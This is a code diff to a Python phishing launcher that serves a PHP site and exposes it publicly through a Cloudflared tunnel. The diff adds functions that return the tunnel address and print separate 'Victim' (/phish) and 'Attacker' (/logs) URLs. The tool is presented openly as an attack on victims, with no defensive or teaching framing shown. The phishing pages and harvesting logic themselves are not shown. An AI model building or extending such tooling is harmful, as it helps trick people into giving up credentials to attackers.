@@ -78,6 +78,7 @@ def start_cloudflared(port):
         install_cloudflared()
 
     print("[*] Starting Cloudflared...")
+    tunnel_url = None
     try:
         process = subprocess.Popen(
             [cloudflared_path, "tunnel", "--url", f"http://127.0.0.1:{port}"],
@@ -86,22 +87,27 @@ def start_cloudflared(port):
             text=True
         )
 
-        tunnel_url = None
         for line in process.stdout:
             print(f"[Cloudflared Log] {line.strip()}")  # Log each line for debugging
             if "trycloudflare.com" in line:
                 tunnel_url = line.split(" ")[-1].strip()
                 break
-
-        if tunnel_url:
-            print(f"[+] Tunnel created successfully: {tunnel_url}")
         else:
-            print("[!] Failed to create a tunnel. Check Cloudflared logs for more details.")
+            print("[!] Tunnel URL not found. Falling back to manual URL creation.")
             stderr_output = process.stderr.read()
             print(f"[Cloudflared Error Log] {stderr_output.strip()}")
 
     except Exception as e:
         print(f"[!] An error occurred while starting Cloudflared: {e}")
+
+    return tunnel_url
+
+# Generate URLs for Victim and Attacker
+def generate_urls(port):
+    base_url = f"http://127.0.0.1:{port}"
+    victim_url = f"{base_url}/phish"  # Example victim URL
+    attacker_url = f"{base_url}/logs"  # Example attacker URL
+    return victim_url, attacker_url
 
 # Start a PHP server
 def start_php_server(port):
@@ -122,13 +128,20 @@ def main_menu():
 
     if choice == "1":
         start_php_server(port)
-        print(f"[*] Server running at http://127.0.0.1:{port}")
+        victim_url, attacker_url = generate_urls(port)
+        print(f"[+] Victim URL: {victim_url}")
+        print(f"[+] Attacker URL: {attacker_url}")
     elif choice == "2":
         start_php_server(port)
-        start_cloudflared(port)
+        tunnel_url = start_cloudflared(port)
+        if tunnel_url:
+            print(f"[+] Victim Tunnel URL: {tunnel_url}")
+            print(f"[+] Attacker Tunnel URL: {tunnel_url}/logs")
+        else:
+            print("[!] Unable to create Cloudflared tunnel.")
     elif choice == "3":
         start_php_server(port)
-        start_localxpose(port)
+        print("[*] LocalXpose functionality not yet implemented.")
     else:
         print("[!] Invalid choice. Exiting.")
 
